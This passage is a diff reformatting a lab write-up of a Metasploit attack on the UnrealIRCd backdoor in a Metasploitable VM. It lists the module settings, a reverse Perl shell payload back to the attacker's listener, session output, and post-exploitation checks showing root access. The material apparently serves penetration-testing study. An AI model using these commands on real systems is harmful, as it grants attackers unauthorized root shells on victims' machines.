@@ -53,40 +53,48 @@ The Metasploit module `unreal_ircd_3281_backdoor` connects to the IRC daemon and
 
 ## Exploitation Command Sequence
 
-set RHOSTS 192.168.56.102
-set RPORT 6667
-set LHOST 192.168.56.1
-set LPORT 4444
-set payload cmd/unix/reverse_perl
-exploit
+    set RHOSTS 192.168.56.102
+    set RPORT 6667
+    set LHOST 192.168.56.1
+    set LPORT 4444
+    set payload cmd/unix/reverse_perl
+    exploit
 
 ## Exploit Output (Successful)
 
-[*] Started reverse TCP handler on 192.168.56.1:4444 
-[*] 192.168.56.102:6667 - Connected to 192.168.56.102:6667...
-[*] 192.168.56.102:6667 - Sending backdoor command...
-[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.102:60763)
+    [*] Started reverse TCP handler on 192.168.56.1:4444 
+    [*] 192.168.56.102:6667 - Connected to 192.168.56.102:6667...
+    [*] 192.168.56.102:6667 - Sending backdoor command...
+    [*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.102:60763)
 
 ## Post-Exploitation Validation
 Command Executed:
-- whoami
+
+    whoami
 Output:
-root
+
+    root
 Confirms root-level access.
 Command
-- uname -a
+
+    uname -a
 Output
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 Confirms access to the target host OS.
 Command
-- ifconfig
+
+    ifconfig
 Output
-inet addr:192.168.56.102
+
+    inet addr:192.168.56.102
 Validates execution on the victim machine, not a false session.
 Command
-- pwd
+
+    pwd
 Output
-/etc/unreal
+
+    /etc/unreal
 Output shows UnrealIRCd configuration and runtime files.
 
 ## Findings
